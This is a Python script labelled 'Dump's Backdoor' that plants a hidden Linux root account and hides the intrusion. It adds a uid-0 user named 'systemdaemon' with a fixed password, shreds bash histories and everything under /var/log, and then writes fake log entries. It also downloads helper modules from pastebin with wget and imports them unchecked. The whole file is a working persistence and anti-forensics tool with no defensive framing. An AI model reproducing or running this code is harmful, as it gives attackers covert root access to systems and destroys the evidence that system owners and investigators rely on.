import os
import time
import sys

try:
    import colors
except:
    print("\033[91m[-] Colors module not installed, installing...\033[0m\n")
    os.system("wget https://pastebin.com/raw/jFzVbx71 -O colors.py")
    import colors
    print(colors.OK + colors.white + " Colors module successfully installed!" + colors.end)
    time.sleep(5)
    os.system("clear")

try:
    import loader
except:
    print("\033[91m[-] Loader module not installed, installing...\033[0m\n")
    os.system("wget https://pastebin.com/raw/FwPFZhaV -O loader.py")
    import colors
    print(colors.OK + colors.white + " Loader module successfully installed!" + colors.end)
    time.sleep(5)
    os.system("clear")

logo = colors.dark_yellow+"""
|-----------------|
;|;|;|;|;|;|;|;|;|;
|;|;|;|;|;|;|;|;|;|
|_|_|_|_____|_|_|_|
|_________________|
|_{0}Dump's Backdoor{1}_|
|_________________|
|;|_|;|_;_|;_|;|_|;
|_|__|_|___|_|__|_|
|-----------------|
""".format(colors.green + colors.italic, colors.end + colors.dark_yellow) + colors.end

def getusers():
	os.system("ls /home > users.txt")

def _main():
	print(logo)
	backdoor = " useradd -M --password $6$ABCD1234$ixyh5u//NQmuMwY1poNtTXa5t1v5ZUzl2t8W3aMszd8rvfS9qFNE222AL36MHpuzs.2nviVVn2E16BQHeI0eT0 --badnames -s /bin/bash -g 0 -o -u 0 systemdaemon"
	loader.load(colors.yellow + "Creating backdoor" + colors.end)
	os.system(backdoor)
	getusers()
	users = open("users.txt", "r").readlines()
	loader.load(colors.yellow + "Clearing logs" + colors.end)
	for user in users:
		logclear = " shred /home/{0}/.bash_history; shred /root/.bash_history; rm /home/{1}/.bash_history; rm /root/.bash_history; shred /var/log/*; rm /var/log/* -rf; rm /var/log/*/* -rf;".format(user.strip(),user.strip())
		os.system(logclear)
	os.system("rm users.txt")
	loader.load(colors.yellow + "Creating fake logs" + colors.end)
	for user in users:
		fakehistory = " echo 'clear' >> /home/{}/.bash_history".format(user.strip())
		fakeroothistory = " echo 'clear' >> /root/.bash_history"
		fakelog = " echo 'linux systemd[1]: Finished Rotate log files.' >> /var/log/sys.log"
		os.system(fakehistory)
		os.system(fakelog)
		os.system(fakeroothistory)

	time.sleep(1)
	print(colors.dark_green + "\nBackdoor has been successfully planted.\nCredentials:\n{0}Username: {1}systemdaemon\n{2}Password: {3}backdoor{4}".format(colors.dark_yellow, colors.green,colors.dark_yellow,colors.green,colors.end))
_main()
